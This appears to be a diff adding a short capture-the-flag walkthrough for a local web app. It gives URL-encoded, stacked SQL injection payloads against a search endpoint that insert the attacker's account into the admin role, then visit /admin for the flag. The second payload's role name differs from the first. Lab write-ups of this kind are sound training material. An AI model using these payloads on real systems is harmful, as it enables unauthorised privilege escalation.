@@ -1,0 +1,15 @@
+Log in as your normal user (e.g. attacker@example.com).
+
+Hit the search endpoint again with a properly URL-encoded, semicolon-terminated injection. For example (replace the email if needed):
+```
+http://localhost:5000/search?q=%25%27%20%3B%20INSERT%20INTO%20roles_users(user_id,role_id)%20VALUES((SELECT%20id%20FROM%20%22user%22%20WHERE%20email%3D%27attacker@example.com%27),(SELECT%20id%20FROM%20role%20WHERE%20name%3D%27admin%27))%20%3B%20--%20
+```
+URL-encoded full example:
+```
+/search?q=%25'%3B%20INSERT%20INTO%20roles_users(user_id,role_id)%20VALUES((SELECT%20id%20FROM%20"user"%20WHERE%20email='test@test.com'),(SELECT%20id%20FROM%20role%20WHERE%20name='l3omda'))%3B%20--%20
+```
+If successful, your user will have the admin role—then visit:
+```
+http://localhost:5000/admin
+```
+to see the flag
